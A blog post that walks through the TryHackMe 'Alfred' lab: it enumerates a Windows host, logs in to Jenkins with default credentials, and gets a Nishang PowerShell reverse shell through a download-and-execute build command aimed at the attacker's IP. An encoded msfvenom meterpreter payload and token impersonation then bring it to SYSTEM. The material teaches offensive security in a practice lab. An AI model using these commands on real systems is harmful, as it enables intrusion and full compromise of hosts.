---
layout: post
title: Pentesting&58; TryHackMe/Alfred
---

## TryHackMe: Alfred Write-up

### Enumeration

#### nmap
```
# Nmap 7.92 scan initiated Sun Oct  2 17:42:41 2022 as: nmap -v -Pn -sC -sV -p- -oN alltcp.txt 10.10.64.93
Nmap scan report for 10.10.64.93
Host is up (0.15s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 7.5
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
3389/tcp open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: ALFRED
|   NetBIOS_Domain_Name: ALFRED
|   NetBIOS_Computer_Name: ALFRED
|   DNS_Domain_Name: alfred
|   DNS_Computer_Name: alfred
|   Product_Version: 6.1.7601
|_  System_Time: 2022-10-03T00:48:46+00:00
|_ssl-date: 2022-10-03T00:48:48+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=alfred
| Issuer: commonName=alfred
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-10-01T23:45:54
| Not valid after:  2023-04-02T23:45:54
| MD5:   9f6c 0875 00bd 4b58 7cad c1bf c9b9 31f8
|_SHA-1: 9ad9 4425 7e24 7137 2b67 a8e2 ec80 c1fd 0887 8103
8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct  2 17:48:48 2022 -- 1 IP address (1 host up) scanned in 367.04 secondsa
```

#### gobuster
```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.64.93/
[+] Method:                  GET
[+] Threads:                 16
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,html,php,asp,aspx,jsp
[+] Timeout:                 10s
===============================================================
2022/10/02 16:51:53 Starting gobuster in directory enumeration mode
===============================================================
/Index.html           (Status: 200) [Size: 289]
/index.html           (Status: 200) [Size: 289]
/index.html           (Status: 200) [Size: 289]
                                               
===============================================================
2022/10/02 16:57:11 Finished
===============================================================a
```

#### HTTP Port 80
```
# Nmap 7.92 scan initiated Sun Oct  2 17:52:26 2022 as: nmap -Pn -sV -p 80 "--script=banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)" -oN tcp_port_80_protocol_nmap.txt 10.10.64.93
Nmap scan report for 10.10.64.93
Host is up (0.15s latency).

Bug in http-security-headers: no string output.
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 1; jpg: 1
|   Longest directory structure:
|     Depth: 0
|     Dir: /
|   Total files found (by extension):
|_    Other: 1; jpg: 1
|_http-exif-spider: ERROR: Script execution failed (use -d to debug)
|_http-comments-displayer: Couldn't find any comments.
|_http-mobileversion-checker: No mobile version detected.
|_http-referer-checker: Couldn't find any cross-domain scripts.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-useragent-tester: 
|   Status for browser useragent: 200
|   Allowed User Agents: 
|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
|     libwww
|     lwp-trivial
|     libcurl-agent/1.0
|     PHP/
|     Python-urllib/2.5
|     GT::WWW
|     Snoopy
|     MFC_Tear_Sample
|     HTTP::Lite
|     PHPCrawl
|     URI::Fetch
|     Zend_Http_Client
|     http client
|     PECL::HTTP
|     Wget/1.13.4 (linux-gnu)
|_    WWW-Mechanize/1.34
|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
|_http-errors: Couldn't find any error pages.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-grep: 
|   (1) http://10.10.64.93:80/: 
|     (1) email: 
|_      + alfred@wayneenterprises.com
|_http-fetch: Please enter the complete path of the directory to save data in.
|_http-server-header: Microsoft-IIS/7.5
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-title: Site doesn't have a title (text/html).
| http-vhosts: 
|_128 names had status 200
|_http-chrono: Request times for /; avg: 388.67ms; min: 311.75ms; max: 414.22ms
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-feed: Couldn't find any feeds.
| http-traceroute: 
|_  Possible reverse proxy detected.
|_http-date: Mon, 03 Oct 2022 00:52:32 GMT; -2s from local time.
| http-headers: 
|   Content-Length: 289
|   Content-Type: text/html
|   Last-Modified: Fri, 25 Oct 2019 22:42:13 GMT
|   Accept-Ranges: bytes
|   ETag: "de32b271858bd51:0"
|   Server: Microsoft-IIS/7.5
|   Date: Mon, 03 Oct 2022 00:52:33 GMT
|   Connection: close
|   
|_  (Request type: HEAD)
|_http-config-backup: ERROR: Script execution failed (use -d to debug)
|_http-malware-host: Host appears to be clean
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct  2 17:59:04 2022 -- 1 IP address (1 host up) scanned in 398.90 secondsa
```

#### HTTP Port 8080
```
# Nmap 7.92 scan initiated Sun Oct  2 17:52:57 2022 as: nmap -Pn -sV -p 8080 "--script=banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)" -oN tcp_port_8080_protocol_nmap.txt 10.10.64.93
Nmap scan report for 10.10.64.93
Host is up (0.15s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 9.4.z-SNAPSHOT
|_http-feed: Couldn't find any feeds.
|_http-date: Mon, 03 Oct 2022 00:53:09 GMT; 0s from local time.
|_http-malware-host: Host appears to be clean
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-robots.txt: 1 disallowed entry 
|_/
| http-sitemap-generator: 
|   Directory structure:
|   Longest directory structure:
|     Depth: 0
|     Dir: /
|   Total files found (by extension):
|_    
|_http-mobileversion-checker: No mobile version detected.
| http-enum: 
|_  /robots.txt: Robots file
|_http-chrono: Request times for /; avg: 382.49ms; min: 317.40ms; max: 452.05ms
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-useragent-tester: 
|   Status for browser useragent: 403
|   Allowed User Agents: 
|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
|     libwww
|     lwp-trivial
|     libcurl-agent/1.0
|     PHP/
|     Python-urllib/2.5
|     GT::WWW
|     Snoopy
|     MFC_Tear_Sample
|     HTTP::Lite
|     PHPCrawl
|     URI::Fetch
|     Zend_Http_Client
|     http client
|     PECL::HTTP
|     Wget/1.13.4 (linux-gnu)
|_    WWW-Mechanize/1.34
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
| http-security-headers: 
|   X_Content_Type_Options: 
|     Header: X-Content-Type-Options: nosniff
|     Description: Will prevent the browser from MIME-sniffing a response away from the declared content-type. 
|   Expires: 
|_    Header: Expires: Thu, 01 Jan 1970 00:00:00 GMT
|_http-referer-checker: Couldn't find any cross-domain scripts.
| http-vhosts: 
|_128 names had status 403
| http-devframework: 
|   Jenkins detected. Found Jenkins version 2.190.1
|   X-Hudson : 1.395
|_  X-Jenkins-Session : 57053bc7
| http-errors: 
| Spidering limited to: maxpagecount=40; withinhost=10.10.64.93
|   Found the following error pages: 
|   
|   Error Code: 403
|_  	http://10.10.64.93:8080/
| http-headers: 
|   Connection: close
|   Date: Mon, 03 Oct 2022 00:53:12 GMT
|   X-Content-Type-Options: nosniff
|   Set-Cookie: JSESSIONID.44f80879=node01w2bv249pegwz1px9uco9tivoe623.node0;Path=/;HttpOnly
|   Expires: Thu, 01 Jan 1970 00:00:00 GMT
|   Content-Type: text/html;charset=utf-8
|   X-Hudson: 1.395
|   X-Jenkins: 2.190.1
|   X-Jenkins-Session: 57053bc7
|   X-You-Are-Authenticated-As: anonymous
|   X-You-Are-In-Group-Disabled: JENKINS-39402: use -Dhudson.security.AccessDeniedException2.REPORT_GROUP_HEADERS=true or use /whoAmI to diagnose
|   X-Required-Permission: hudson.model.Hudson.Read
|   X-Permission-Implied-By: hudson.security.Permission.GenericRead
|   X-Permission-Implied-By: hudson.model.Hudson.Administer
|   Content-Length: 799
|   Server: Jetty(9.4.z-SNAPSHOT)
|   
|_  (Request type: GET)
|_http-fetch: Please enter the complete path of the directory to save data in.
| http-comments-displayer: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.64.93
|     
|     Path: http://10.10.64.93:8080/
|     Line number: 5
|     Comment: 
|         <!--
|         
|         
|         
|         
|         
|         
|_        -->
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-traceroute: 
|_  Possible reverse proxy detected.
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-config-backup: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct  2 17:58:59 2022 -- 1 IP address (1 host up) scanned in 362.17 secondsa
```

#### RDP
```
# Nmap 7.92 scan initiated Sun Oct  2 17:53:25 2022 as: nmap -Pn -sV -p 3389 "--script=banner,(rdp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN tcp_3389_rdp_nmap.txt 10.10.64.93
Nmap scan report for 10.10.64.93
Host is up (0.15s latency).

PORT     STATE SERVICE            VERSION
3389/tcp open  ssl/ms-wbt-server?
| rdp-vuln-ms12-020: 
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|           
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|   
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|           
|     Disclosure date: 2012-03-13
|     References:
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
| rdp-enum-encryption: 
|   Security layer
|     CredSSP (NLA): SUCCESS
|     CredSSP with Early User Auth: SUCCESS
|     Native RDP: SUCCESS
|     RDSTLS: SUCCESS
|     SSL: SUCCESS
|   RDP Encryption level: Client Compatible
|     40-bit RC4: SUCCESS
|     56-bit RC4: SUCCESS
|     128-bit RC4: SUCCESS
|     FIPS 140-1: SUCCESS
|_  RDP Protocol Version:  RDP 5.x, 6.x, 7.x, or 8.x server
| rdp-ntlm-info: 
|   Target_Name: ALFRED
|   NetBIOS_Domain_Name: ALFRED
|   NetBIOS_Computer_Name: ALFRED
|   DNS_Domain_Name: alfred
|   DNS_Computer_Name: alfred
|   Product_Version: 6.1.7601
|_  System_Time: 2022-10-03T00:55:02+00:00
|_ssl-date: 2022-10-03T00:55:22+00:00; 0s from scanner time.
|_ssl-ccs-injection: No reply from server (TIMEOUT)
| ssl-cert: Subject: commonName=alfred
| Issuer: commonName=alfred
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2022-10-01T23:45:54
| Not valid after:  2023-04-02T23:45:54
| MD5:   9f6c 0875 00bd 4b58 7cad c1bf c9b9 31f8
|_SHA-1: 9ad9 4425 7e24 7137 2b67 a8e2 ec80 c1fd 0887 8103

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct  2 17:55:28 2022 -- 1 IP address (1 host up) scanned in 123.31 secondsa
```

### Foothold

Checking out the webpages in the browser, IP:8080 provides a jenkins login page. Jenkins is an automated server specializing in allowing developers to build, test, and deploy thier software in a continuous manner. Searching for default credentials, we see that username:admin and password:admin are default. Those allow use to successfully login to the dashboard.

Once in, we can navigate to the configure tab on the left hand menu. Here we find a build configuration menu with the ability to input commands in the "build" section.

Let's use the following command to download the ninjang reverse shell script found [here](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) and save/apply the build.
```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.2.11.19:80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.2.11.19 Port 4444
```

Then, we need to setup our server and our listener with the following commands.
```
python -m http.server 80
nc -lvnp 4444
```

Once we have these setup, we can navigate to the dashboard and click the "Build" button. That will instruct the target to download the script from our system and execute the shell script with our ip and listener port. Now we have a reverse shell.

### Privilege Escalation

Now that we have a shell, we can try and upgrade the shell to a meterpreter shell to make privesc a little easier. To do this, we can use msfvenom to generate a meterpreter shell script.
```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.2.11.19 LPORT=4443 -f exe -o shell.exe
```

We use the encoder flag to encode the payload. This is done to ensure correct transmission and to help with antivirus evasion. Now let's download the meterpreter shell code to the target with the following command.
```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.2.11.19:80/shell.exe','shell.exe')"
```

Now we need to setup our hander. Start msfconsole and enter the following command.
```
use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 10.2.11.19 set LPORT 4443
```

To double check, use the options command to ensure the lhost and lport are set correctly and press run. Now we can execute the shell code on the target and get a meterpreter shell.
```
Start-Process "shell.exe"
```

Now we have a meterpreter shell. To elevate our privileges, we can do whats called token impersonation. 

#### Tokens

Windows uses tokens to ensure certain accounts have the right privileges to carry out certain tasks. Users are assigned tokens when they login/authenticate. This is usually carried out by the LSASS.exe process. Generally, tokens consist of three parts:
* user SIDs (Security IDentifier)
* group SIDs
* privileges

There are two types of tokens:
* Primary access tokens: These are assigned to the user when the user authenticates
* Impersonation tokens: These are used by a particular process to grant privileges using the access token of another user or process

Three levels of impersonation tokens:
* SecurityAnonymous: Current user/process cannot impersonate another user/process
* SecurityIdentification: Current user/process can get the identity of another user/process, but cannot impersonate that user/process
* SecurityImpersonation: Current user/process can impersonate another user/process's security data on the local system
* SecurityDelegation: Current user/process can impersonate another user/process;s security data on a remote system

A deeper dive into tokens can be found [here](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens).

And a more in depth resource regarding token abuse can be found [here](https://www.exploit-db.com/papers/42556),

#### Abusing tokens on the target

We can view the privileges of the user we are logged in as with the following command.
```
whoami /priv
```

Two interesting privleges are listed, SeDebugPrivilege and SeImpersonatePrivilege. We can use the incognito command in our meterpreter shell to abuse these privilege tokens. To do that, use the following command in your meterpreter shell.
```
load incognito
```

Now in the meterpreter shell, we can use the following command to get a list of available tokens.
```
list_tokens -g
```

We can see that the BUILTIN\Administrator token is available. Use the impersonate_token command to impersonate this token.
```
impersonate_token "BUILTIN\Administrators"
```

Now we are system according to the getuid command.
```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

The last step is to migrate to a process with root permissions. Since windows uses the primary token for privileges to determine what the process can and cannot do, this is necessary. The easiest process to migrate to to accomplish this is services.exe.
```
meterpreter > ps

Process List
============

 PID   PPID  Name      Arch  Session  User        Path
 ---   ----  ----      ----  -------  ----        ----
 0     0     [System
             Process]
 4     0     System    x64   0
 396   4     smss.exe  x64   0        NT AUTHORI  C:\Windows\
                                      TY\SYSTEM   System32\sm
                                                  ss.exe
 524   516   csrss.ex  x64   0        NT AUTHORI  C:\Windows\
             e                        TY\SYSTEM   System32\cs
                                                  rss.exe
 564   1668  powershe  x86   0        alfred\bru  C:\Windows\
             ll.exe                   ce          SysWOW64\Wi
                                                  ndowsPowerS
                                                  hell\v1.0\p
                                                  owershell.e
                                                  xe
 572   564   csrss.ex  x64   1        NT AUTHORI  C:\Windows\
             e                        TY\SYSTEM   System32\cs
                                                  rss.exe
 580   516   wininit.  x64   0        NT AUTHORI  C:\Windows\
             exe                      TY\SYSTEM   System32\wi
                                                  ninit.exe
 608   564   winlogon  x64   1        NT AUTHORI  C:\Windows\
             .exe                     TY\SYSTEM   System32\wi
                                                  nlogon.exe
 668   580   services  x64   0        NT AUTHORI  C:\Windows\
             .exe                     TY\SYSTEM   System32\se
                                                  rvices.exe
 676   580   lsass.ex  x64   0        NT AUTHORI  C:\Windows\
             e                        TY\SYSTEM   System32\ls
                                                  ass.exe
 684   580   lsm.exe   x64   0        NT AUTHORI  C:\Windows\
                                      TY\SYSTEM   System32\ls
                                                  m.exe
 772   668   svchost.  x64   0        NT AUTHORI  C:\Windows\
             exe                      TY\SYSTEM   System32\sv
                                                  chost.exe
 848   668   svchost.  x64   0        NT AUTHORI  C:\Windows\
             exe                      TY\NETWORK  System32\sv
                                       SERVICE    chost.exe
 916   668   svchost.  x64   0        NT AUTHORI  C:\Windows\
             exe                      TY\LOCAL S  System32\sv
                                      ERVICE      chost.exe
 920   608   LogonUI.  x64   1        NT AUTHORI  C:\Windows\
             exe                      TY\SYSTEM   System32\Lo
                                                  gonUI.exe
 936   668   svchost.  x64   0        NT AUTHORI  C:\Windows\
             exe                      TY\LOCAL S  System32\sv
                                      ERVICE      chost.exe
 984   668   svchost.  x64   0        NT AUTHORI  C:\Windows\
             exe                      TY\SYSTEM   System32\sv
                                                  chost.exe
 1012  668   svchost.  x64   0        NT AUTHORI  C:\Windows\
             exe                      TY\SYSTEM   System32\sv
                                                  chost.exe
 1068  668   svchost.  x64   0        NT AUTHORI  C:\Windows\
             exe                      TY\NETWORK  System32\sv
                                       SERVICE    chost.exe
 1208  668   spoolsv.  x64   0        NT AUTHORI  C:\Windows\
             exe                      TY\SYSTEM   System32\sp
                                                  oolsv.exe
 1236  668   svchost.  x64   0        NT AUTHORI  C:\Windows\
             exe                      TY\LOCAL S  System32\sv
                                      ERVICE      chost.exe
 1340  668   amazon-s  x64   0        NT AUTHORI  C:\Program
             sm-agent                 TY\SYSTEM   Files\Amazo
             .exe                                 n\SSM\amazo
                                                  n-ssm-agent
                                                  .exe
 1424  668   svchost.  x64   0        NT AUTHORI  C:\Windows\
             exe                      TY\SYSTEM   System32\sv
                                                  chost.exe
 1448  668   LiteAgen  x64   0        NT AUTHORI  C:\Program
             t.exe                    TY\SYSTEM   Files\Amazo
                                                  n\Xentools\
                                                  LiteAgent.e
                                                  xe
 1476  668   svchost.  x64   0        NT AUTHORI  C:\Windows\
             exe                      TY\LOCAL S  System32\sv
                                      ERVICE      chost.exe
 1616  668   jenkins.  x64   0        alfred\bru  C:\Program
             exe                      ce          Files (x86)
                                                  \Jenkins\je
                                                  nkins.exe
 1668  1804  cmd.exe   x86   0        alfred\bru  C:\Windows\
                                      ce          SysWOW64\cm
                                                  d.exe
 1704  668   svchost.  x64   0        NT AUTHORI  C:\Windows\
             exe                      TY\SYSTEM   System32\sv
                                                  chost.exe
 1804  1616  java.exe  x86   0        alfred\bru  C:\Program
                                      ce          Files (x86)
                                                  \Jenkins\jr
                                                  e\bin\java.
                                                  exe
 1820  668   Ec2Confi  x64   0        NT AUTHORI  C:\Program
             g.exe                    TY\SYSTEM   Files\Amazo
                                                  n\Ec2Config
                                                  Service\Ec2
                                                  Config.exe
 1892  524   conhost.  x64   0        alfred\bru  C:\Windows\
             exe                      ce          System32\co
                                                  nhost.exe
 2000  668   SearchIn  x64   0        NT AUTHORI  C:\Windows\
             dexer.ex                 TY\SYSTEM   System32\Se
             e                                    archIndexer
                                                  .exe
 2052  668   svchost.  x64   0        NT AUTHORI  C:\Windows\
             exe                      TY\NETWORK  System32\sv
                                       SERVICE    chost.exe
 2288  772   WmiPrvSE  x64   0        NT AUTHORI  C:\Windows\
             .exe                     TY\NETWORK  System32\wb
                                       SERVICE    em\WmiPrvSE
                                                  .exe
 2388  564   shell.ex  x86   0        alfred\bru  C:\Program
             e                        ce          Files (x86)
                                                  \Jenkins\wo
                                                  rkspace\pro
                                                  ject\shell.
                                                  exe
 2516  524   conhost.  x64   0        alfred\bru  C:\Windows\
             exe                      ce          System32\co
                                                  nhost.exe
 2528  564   shell.ex  x86   0        alfred\bru  C:\Program
             e                        ce          Files (x86)
                                                  \Jenkins\wo
                                                  rkspace\pro
                                                  ject\shell.
                                                  exe
 2648  668   sppsvc.e  x64   0        NT AUTHORI  C:\Windows\
             xe                       TY\NETWORK  System32\sp
                                       SERVICE    psvc.exe
 2712  668   svchost.  x64   0        NT AUTHORI  C:\Windows\
             exe                      TY\SYSTEM   System32\sv
                                                  chost.exe
 2984  668   TrustedI  x64   0        NT AUTHORI  C:\Windows\
             nstaller                 TY\SYSTEM   servicing\T
             .exe                                 rustedInsta
                                                  ller.exea
```

Now we run the migrate command with the PID of services.exe
```
meterpreter > migrate 668
[*] Migrating from 2528 to 668...
[*] Migration completed successfully.
```

Now we have succesfully elevated to root. Et Voila!
